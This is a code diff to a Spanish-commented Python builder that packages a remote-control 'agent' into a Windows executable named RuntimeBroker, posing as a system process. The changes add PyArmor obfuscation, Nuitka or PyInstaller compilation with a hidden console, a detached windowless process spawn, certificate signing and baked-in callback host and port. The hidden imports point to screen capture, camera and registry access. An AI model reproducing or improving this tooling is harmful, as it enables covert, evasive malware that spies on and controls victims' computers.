@@ -5,11 +5,20 @@ Cadena de ofuscación/compilación:
   1) PyArmor  -> ofusca el agente (si está instalado)
   2) Nuitka   -> compila (sin UPX, metadatos legítimos)   [recomendado]
   3) PyInstaller -> fallback (--noupx)
-El payload se auto-desprende (spawn detached + exit) para no quedar abierto.
+
+FIX 1 (_MEI): el payload se auto-desprende (spawn detached + exit). En --onefile
+el hijo DEBE lanzarse con entorno limpio (PYINSTALLER_RESET_ENVIRONMENT=1 y sin
+_PYI_* / _MEIPASS2); si no, hereda las variables del bootloader del padre, se
+ejecuta desde la carpeta _MEI del padre y muere al borrarla este. Ver _entry().
+
+FIX 2 (WinError 32): cada build usa una carpeta de trabajo ÚNICA para no chocar
+con el RuntimeBroker.pkg bloqueado de la build anterior (antivirus / instancia
+viva). Además se cierran instancias del payload y se reintenta. Ver generar_exe().
 """
 import os
 import sys
 import shutil
+import stat
 import struct
 import zlib
 import subprocess
@@ -19,12 +28,14 @@ import time
 from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
 
 ES_WIN = sys.platform.startswith("win")
+CREATE_NO_WINDOW = 0x08000000
 
 
 class Constructor:
     def __init__(self, host, puerto, log=None, nombre="RuntimeBroker",
                  icono=None, upx=None, certificado=None, contrasena_cert=None,
-                 compilador="auto", lto=False, mingw=False, usar_pyarmor=False):
+                 compilador="auto", lto=False, mingw=False, usar_pyarmor=False,
+                 matar_payload=True):
         self.host = (host or "127.0.0.1").strip()
         self.puerto = str(puerto or "8000").strip()
         self.log = log or (lambda t: None)
@@ -37,6 +48,7 @@ class Constructor:
         self.lto = bool(lto)
         self.mingw = bool(mingw)
         self.usar_pyarmor = bool(usar_pyarmor)
+        self.matar_payload = bool(matar_payload)
 
         self.base = os.path.dirname(os.path.abspath(__file__))
         self.raiz = os.path.dirname(os.path.dirname(self.base))
@@ -63,6 +75,7 @@ class Constructor:
                 return c
         self.log(f"[builder] ERROR: no encontré agente.py (busqué en {self.raiz})")
         return None
+
     @staticmethod
     def _ip_local():
         import socket
@@ -96,23 +109,94 @@ class Constructor:
     def _args(self):
         return f'{self.host} {self.puerto} {self.fallback}'
 
+    @staticmethod
+    def _sello():
+        return f"{time.strftime('%Y%m%d_%H%M%S')}_{os.getpid()}"
+
+    def _rmtree_robusto(self, ruta, intentos=4):
+        """Borra una carpeta aunque haya archivos de solo-lectura/bloqueados."""
+        if not ruta or not os.path.isdir(ruta):
+            return True
+
+        def _forzar(func, path):
+            try:
+                os.chmod(path, stat.S_IWRITE | stat.S_IREAD)
+                func(path)
+            except Exception:
+                pass
+
+        for _ in range(intentos):
+            try:
+                if sys.version_info >= (3, 12):
+                    shutil.rmtree(ruta, onexc=lambda f, p, e: _forzar(f, p))
+                else:
+                    shutil.rmtree(ruta, onerror=lambda f, p, e: _forzar(f, p))
+            except Exception:
+                pass
+            if not os.path.isdir(ruta):
+                return True
+            time.sleep(0.6)
+        return not os.path.isdir(ruta)
+
+    def _matar_payload(self):
+        """Cierra instancias en ejecución del exe (suelen bloquear archivos)."""
+        if not ES_WIN:
+            return
+        exe = self.nombre + ".exe"
+        try:
+            r = subprocess.run(["tasklist", "/FI", f"IMAGENAME eq {exe}", "/NH"],
+                               capture_output=True, text=True,
+                               creationflags=CREATE_NO_WINDOW)
+            if exe.lower() in (r.stdout or "").lower():
+                subprocess.run(["taskkill", "/IM", exe, "/F", "/T"],
+                               capture_output=True, text=True,
+                               creationflags=CREATE_NO_WINDOW)
+                self.log(f"[builder] cerradas instancias de {exe} antes de compilar")
+                time.sleep(0.8)
+        except Exception as e:
+            self.log(f"[builder] aviso al comprobar procesos: {e}")
+
+    def _limpiar_builds_viejos(self, conservar=()):
+        try:
+            for n in os.listdir(self.build):
+                if n.startswith(("work_", "dist_tmp_")) and n not in conservar:
+                    self._rmtree_robusto(os.path.join(self.build, n))
+        except Exception:
+            pass
+
     # ------------------------------------------------------------------ entry
     def _entry(self):
+        """_entry.py del .exe.
+
+        El detach (spawn + exit) es necesario para que el payload no quede atado
+        a la consola/lanzador. El punto CRÍTICO es lanzar el hijo con
+        PYINSTALLER_RESET_ENVIRONMENT=1 y sin _PYI_* / _MEIPASS2, para que el
+        bootloader del hijo extraiga su PROPIA carpeta _MEI y no herede la del
+        padre (que este borra al salir).
+        """
         return (
             "import os, sys, subprocess\n"
             "sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))\n"
-            f'_HOST = {self.host!r}\n'
-            f'_PORT = {self.puerto!r}\n'
-            f'_HOST2 = {self.fallback!r}\n'
+            f"_HOST = {self.host!r}\n"
+            f"_PORT = {self.puerto!r}\n"
+            f"_HOST2 = {self.fallback!r}\n"
             "os.environ.setdefault('JAGUAR_HOST', _HOST)\n"
             "os.environ.setdefault('JAGUAR_PORT', _PORT)\n"
             "os.environ.setdefault('JAGUAR_HOST2', _HOST2)\n"
             "DETACHED_PROCESS = 0x00000008\n"
             "CREATE_NEW_PROCESS_GROUP = 0x00000200\n"
             "CREATE_NO_WINDOW = 0x08000000\n"
+            "def _entorno_limpio():\n"
+            "    env = os.environ.copy()\n"
+            "    for _k in list(env):\n"
+            "        if _k.startswith('_PYI_') or _k in ('_MEIPASS', '_MEIPASS2'):\n"
+            "            env.pop(_k, None)\n"
+            "    env['PYINSTALLER_RESET_ENVIRONMENT'] = '1'\n"
+            "    return env\n"
             "if sys.platform.startswith('win') and '--jaguar-detached' not in sys.argv:\n"
             "    subprocess.Popen(\n"
             "        [sys.executable, '--jaguar-detached', _HOST, _PORT],\n"
+            "        env=_entorno_limpio(),\n"
             "        creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW,\n"
             "        close_fds=True)\n"
             "    sys.exit(0)\n"
@@ -126,7 +210,8 @@ class Constructor:
     def _tiene_nuitka():
         try:
             r = subprocess.run([sys.executable, "-m", "nuitka", "--version"],
-                               capture_output=True, text=True)
+                               capture_output=True, text=True,
+                               creationflags=CREATE_NO_WINDOW)
             return r.returncode == 0
         except Exception:
             return False
@@ -135,7 +220,8 @@ class Constructor:
     def _tiene_pyarmor():
         try:
             r = subprocess.run([sys.executable, "-m", "pyarmor.cli", "--version"],
-                               capture_output=True, text=True)
+                               capture_output=True, text=True,
+                               creationflags=CREATE_NO_WINDOW)
             return r.returncode == 0
         except Exception:
             return False
@@ -144,8 +230,8 @@ class Constructor:
     def _limpiar_pyarmor(self):
         for n in os.listdir(self.build):
             if n.startswith("pyarmor_runtime"):
-                shutil.rmtree(os.path.join(self.build, n), ignore_errors=True)
-        shutil.rmtree(os.path.join(self.build, "pyarmor_out"), ignore_errors=True)
+                self._rmtree_robusto(os.path.join(self.build, n))
+        self._rmtree_robusto(os.path.join(self.build, "pyarmor_out"))
 
     def _obfuscar_pyarmor(self):
         """Ofusca agente_jaguar.py con PyArmor dentro de self.build.
@@ -159,12 +245,12 @@ class Constructor:
             ["gen", "-O", out, src],
             ["gen", "--output=" + out, src],
         )
-        proc = None
         ok = False
         for args in intentos:
             try:
                 proc = subprocess.run([sys.executable, "-m", "pyarmor.cli"] + args,
-                                      cwd=self.build, capture_output=True, text=True)
+                                      cwd=self.build, capture_output=True, text=True,
+                                      creationflags=CREATE_NO_WINDOW)
             except Exception as e:
                 self.log(f"[builder] PyArmor excepción: {e}")
                 continue
@@ -195,6 +281,11 @@ class Constructor:
                 self.log("[builder] ERROR exe: falta agente.py")
                 return None
             os.makedirs(self.build, exist_ok=True)
+
+            # Cierra instancias vivas (evita WinError 32 sobre archivos de build)
+            if self.matar_payload:
+                self._matar_payload()
+
             shutil.copy2(self.agente, os.path.join(self.build, "agente_jaguar.py"))
             self._escribir(os.path.join(self.build, "_entry.py"), self._entry())
 
@@ -205,18 +296,23 @@ class Constructor:
                 else:
                     self.log("[builder] PyArmor no instalado -> sigo sin ofuscar")
 
-            dist_tmp = os.path.join(self.build, "dist_tmp")
-            shutil.rmtree(dist_tmp, ignore_errors=True)
+            # Carpetas de trabajo ÚNICAS por build (clave contra WinError 32)
+            sello = self._sello()
+            work = os.path.join(self.build, "work_" + sello)
+            dist_tmp = os.path.join(self.build, "dist_tmp_" + sello)
+            self._rmtree_robusto(work)
+            self._rmtree_robusto(dist_tmp)
+            os.makedirs(work, exist_ok=True)
             os.makedirs(dist_tmp, exist_ok=True)
 
             origen = None
             if self.compilador in ("auto", "nuitka"):
                 if self._tiene_nuitka():
-                    origen = self._compilar_nuitka(dist_tmp, runtime)
+                    origen = self._compilar_nuitka(dist_tmp, work, runtime)
                 else:
                     self.log("[builder] Nuitka no instalado -> PyInstaller")
             if not origen:
-                origen = self._compilar_pyinstaller(dist_tmp, runtime)
+                origen = self._compilar_pyinstaller(dist_tmp, work, runtime)
             if not origen or not os.path.isfile(origen):
                 self.log("[builder] ERROR exe: no se produjo salida")
                 return None
@@ -224,6 +320,9 @@ class Constructor:
             destino = self._colocar_exe(origen)
             self._firmar(destino)
             self.log(f"[builder] exe listo: {os.path.basename(destino)}")
+
+            self._limpiar_builds_viejos(conservar=(os.path.basename(work),
+                                                   os.path.basename(dist_tmp)))
             return destino
         except Exception as e:
             self.log(f"[builder] ERROR exe: {e}")
@@ -264,7 +363,8 @@ class Constructor:
         self.log("[builder] $ " + " ".join(str(c) for c in cmd))
         p = subprocess.Popen(cmd, cwd=cwd, stdout=subprocess.PIPE,
                              stderr=subprocess.STDOUT, text=True,
-                             encoding="utf-8", errors="replace", bufsize=1)
+                             encoding="utf-8", errors="replace", bufsize=1,
+                             creationflags=CREATE_NO_WINDOW if ES_WIN else 0)
         ultimas = []
         for ln in p.stdout:
             ln = ln.rstrip()
@@ -279,27 +379,7 @@ class Constructor:
         p.wait()
         return p.returncode, "\n".join(ultimas)
 
-    def _correr_stream(self, cmd, cwd):
-        """Ejecuta un comando mostrando la salida en vivo en el log."""
-        self.log("[builder] $ " + " ".join(str(c) for c in cmd))
-        p = subprocess.Popen(cmd, cwd=cwd, stdout=subprocess.PIPE,
-                             stderr=subprocess.STDOUT, text=True,
-                             encoding="utf-8", errors="replace", bufsize=1)
-        ultimas = []
-        for ln in p.stdout:
-            ln = ln.rstrip()
-            if not ln:
-                continue
-            ultimas.append(ln)
-            del ultimas[:-25]
-            if any(k in ln for k in ("Nuitka", "Compiling", "Scons", "gcc",
-                                     "cl.exe", "link.exe", "Progress", "error",
-                                     "Error", "download", "cache", "backend")):
-                self.log("[nuitka] " + ln)
-        p.wait()
-        return p.returncode, "\n".join(ultimas)
-
-    def _compilar_nuitka(self, dist_tmp, runtime):
+    def _compilar_nuitka(self, dist_tmp, work, runtime):
         exe = os.path.join(dist_tmp, self.nombre + (".exe" if ES_WIN else ""))
         intentos = [["--mingw64"]] if self.mingw else [[], ["--mingw64"]]
         for extra in intentos:
@@ -315,34 +395,54 @@ class Constructor:
             self.log("[builder] Nuitka falló:\n" + cola[-1500:])
         return None
 
-    def _compilar_pyinstaller(self, dist_tmp, runtime):
-        cmd = [sys.executable, "-m", "PyInstaller", "--noconfirm",
-               "--onefile", "--noconsole", "--clean",
-               "--name", self.nombre,
-               "--distpath", dist_tmp,
-               "--workpath", os.path.join(self.build, "work"),
-               "--specpath", self.build,
-               "--hidden-import", "PIL",
-               "--hidden-import", "PIL.Image",
-               "--hidden-import", "PIL.ImageGrab",
-               "--hidden-import", "cv2",
-               "--hidden-import", "winreg",
-               "--paths", self.build]
-        if runtime:
-            cmd += ["--collect-all", runtime]
-        if self.icono and os.path.isfile(self.icono):
-            cmd += ["--icon", os.path.abspath(self.icono)]
-        if self.upx and os.path.isdir(self.upx):
-            cmd += ["--upx-dir", os.path.abspath(self.upx)]
-        else:
-            cmd += ["--noupx"]
-        cmd += ["_entry.py"]
-        self.log("[builder] compilando con PyInstaller...")
-        proc = subprocess.run(cmd, cwd=self.build, capture_output=True, text=True)
-        if proc.returncode != 0:
-            self.log("[builder] ERROR PyInstaller:\n" + (proc.stderr or "")[-1500:])
-            return None
-        return os.path.join(dist_tmp, self.nombre + (".exe" if ES_WIN else ""))
+    def _compilar_pyinstaller(self, dist_tmp, work, runtime, intentos=3):
+        exe = os.path.join(dist_tmp, self.nombre + (".exe" if ES_WIN else ""))
+        salida = ""
+        for i in range(intentos):
+            cmd = [sys.executable, "-m", "PyInstaller", "--noconfirm",
+                   "--onefile", "--noconsole", "--clean",
+                   "--name", self.nombre,
+                   "--distpath", dist_tmp,
+                   "--workpath", work,
+                   "--specpath", work,
+                   "--hidden-import", "PIL",
+                   "--hidden-import", "PIL.Image",
+                   "--hidden-import", "PIL.ImageGrab",
+                   "--hidden-import", "cv2",
+                   "--hidden-import", "winreg",
+                   "--paths", self.build]
+            if runtime:
+                cmd += ["--collect-all", runtime]
+            if self.icono and os.path.isfile(self.icono):
+                cmd += ["--icon", os.path.abspath(self.icono)]
+            if self.upx and os.path.isdir(self.upx):
+                cmd += ["--upx-dir", os.path.abspath(self.upx)]
+            else:
+                cmd += ["--noupx"]
+            cmd += ["_entry.py"]
+
+            self.log(f"[builder] compilando con PyInstaller (intento {i + 1}/{intentos})...")
+            try:
+                proc = subprocess.run(cmd, cwd=self.build, capture_output=True, text=True,
+                                      creationflags=CREATE_NO_WINDOW if ES_WIN else 0)
+            except Exception as e:
+                self.log(f"[builder] PyInstaller excepción: {e}")
+                proc = None
+            salida = ((proc.stderr or "") + "\n" + (proc.stdout or "")) if proc else ""
+
+            if proc is not None and proc.returncode == 0 and os.path.isfile(exe):
+                return exe
+
+            if i < intentos - 1:
+                self.log("[builder] fallo de build (posible archivo bloqueado), reintentando...")
+                self._rmtree_robusto(work)
+                self._rmtree_robusto(dist_tmp)
+                os.makedirs(work, exist_ok=True)
+                os.makedirs(dist_tmp, exist_ok=True)
+                time.sleep(1.5)
+
+        self.log("[builder] ERROR PyInstaller:\n" + salida[-1800:])
+        return None
 
     def _colocar_exe(self, origen, intentos=5):
         ext = ".exe" if ES_WIN else ""
@@ -381,7 +481,8 @@ class Constructor:
             cmd += ["/p", self.contrasena_cert]
         cmd += [exe]
         try:
-            r = subprocess.run(cmd, capture_output=True, text=True)
+            r = subprocess.run(cmd, capture_output=True, text=True,
+                               creationflags=CREATE_NO_WINDOW if ES_WIN else 0)
             self.log("[builder] firmado OK" if r.returncode == 0
                      else "[builder] firma falló: " + (r.stderr or "")[-400:])
         except Exception as e:
@@ -459,7 +560,8 @@ class Constructor:
         )
         with open(vbs, "w", encoding="utf-8") as f:
             f.write(contenido)
-        subprocess.run(["cscript", "//nologo", vbs], capture_output=True, text=True)
+        subprocess.run(["cscript", "//nologo", vbs], capture_output=True, text=True,
+                       creationflags=CREATE_NO_WINDOW if ES_WIN else 0)
         self.log(f"[builder] creado: {os.path.basename(destino)}")
         return destino
 
